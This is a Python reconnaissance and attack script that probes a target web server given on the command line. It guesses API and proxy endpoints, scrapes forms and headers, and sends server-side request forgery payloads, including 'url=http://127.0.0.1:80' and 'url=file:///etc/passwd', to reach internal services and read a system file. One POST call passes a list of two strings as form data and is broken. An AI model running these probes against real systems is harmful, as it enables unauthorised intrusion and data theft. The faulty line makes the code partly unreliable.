#!/usr/bin/env python3
import requests
import urllib.parse
import json
from urllib.parse import urljoin

class EndpointAnalyzer:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
        })
    
    def discover_endpoints(self):
        """Discover common API endpoints"""
        common_endpoints = [
            '/api/weather',
            '/api/fetch',
            '/api/data',
            '/api/proxy',
            '/weather',
            '/fetch',
            '/proxy',
            '/api/v1/weather',
            '/v1/weather',
            '/api/external',
            '/external'
        ]
        
        results = []
        for endpoint in common_endpoints:
            # Test GET
            try:
                response = self.session.get(f"{self.base_url}{endpoint}", timeout=5)
                results.append({
                    'endpoint': endpoint,
                    'method': 'GET',
                    'status': response.status_code,
                    'content_type': response.headers.get('content-type', ''),
                    'response': response.text[:200]
                })
            except Exception as e:
                results.append({
                    'endpoint': endpoint,
                    'method': 'GET',
                    'status': 0,
                    'error': str(e)
                })
            
            # Test POST with URL parameter
            try:
                data = {'url': 'http://example.com'}
                response = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=5)
                results.append({
                    'endpoint': endpoint,
                    'method': 'POST',
                    'status': response.status_code,
                    'content_type': response.headers.get('content-type', ''),
                    'response': response.text[:200]
                })
            except Exception as e:
                results.append({
                    'endpoint': endpoint,
                    'method': 'POST',
                    'status': 0,
                    'error': str(e)
                })
        
        return results
    
    def analyze_form_parameters(self):
        """Analyze form parameters and input fields"""
        try:
            response = self.session.get(self.base_url, timeout=5)
            content = response.text
            
            # Look for form inputs
            import re
            input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
            inputs = re.findall(input_pattern, content, re.IGNORECASE)
            
            # Look for form actions
            form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>'
            forms = re.findall(form_pattern, content, re.IGNORECASE)
            
            return {
                'inputs': inputs,
                'forms': forms,
                'page_content': content[:500]
            }
        except Exception as e:
            return {'error': str(e)}
    
    def test_parameter_pollution(self):
        """Test HTTP parameter pollution"""
        test_params = [
            'url=http://example.com',
            'url=http://127.0.0.1:80',
            'url=file:///etc/passwd',
            'target=http://example.com',
            'endpoint=http://example.com',
            'api=http://example.com'
        ]
        
        results = []
        for param in test_params:
            try:
                # Test as query parameter
                response = self.session.get(f"{self.base_url}?{param}", timeout=5)
                results.append({
                    'param': param,
                    'method': 'GET_QUERY',
                    'status': response.status_code,
                    'response': response.text[:200]
                })
                
                # Test as POST data
                response = self.session.post(self.base_url, data=param.split('='), timeout=5)
                results.append({
                    'param': param,
                    'method': 'POST_FORM',
                    'status': response.status_code,
                    'response': response.text[:200]
                })
            except Exception as e:
                results.append({
                    'param': param,
                    'method': 'ERROR',
                    'error': str(e)
                })
        
        return results
    
    def check_headers(self):
        """Check response headers for interesting information"""
        try:
            response = self.session.get(self.base_url, timeout=5)
            headers = dict(response.headers)
            
            interesting_headers = {}
            for header, value in headers.items():
                if any(key in header.lower() for key in ['server', 'x-', 'content', 'cache', 'set-cookie']):
                    interesting_headers[header] = value
            
            return {
                'all_headers': headers,
                'interesting_headers': interesting_headers,
                'status_code': response.status_code
            }
        except Exception as e:
            return {'error': str(e)}

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) != 2:
        print("Usage: python3 endpoint_analyzer.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1]
    analyzer = EndpointAnalyzer(target_url)
    
    print("=== Discovering Endpoints ===")
    endpoints = analyzer.discover_endpoints()
    for result in endpoints:
        if result.get('status', 0) not in [0, 404]:
            print(f"{result['method']} {result['endpoint']} - Status: {result.get('status', 'N/A')}")
            if result.get('response'):
                print(f"Response: {result['response'][:100]}...")
        print()
    
    print("=== Analyzing Form Parameters ===")
    forms = analyzer.analyze_form_parameters()
    if 'error' not in forms:
        print(f"Found inputs: {forms['inputs']}")
        print(f"Found forms: {forms['forms']}")
    else:
        print(f"Error: {forms['error']}")
    print()
    
    print("=== Testing Parameter Pollution ===")
    params = analyzer.test_parameter_pollution()
    for result in params:
        if result.get('status', 0) not in [0, 404]:
            print(f"{result['method']} {result['param']} - Status: {result.get('status', 'N/A')}")
            if result.get('response'):
                print(f"Response: {result['response'][:100]}...")
        print()
    
    print("=== Checking Headers ===")
    headers = analyzer.check_headers()
    if 'error' not in headers:
        print("Interesting headers:")
        for header, value in headers['interesting_headers'].items():
            print(f"{header}: {value}")
    else:
        print(f"Error: {headers['error']}")
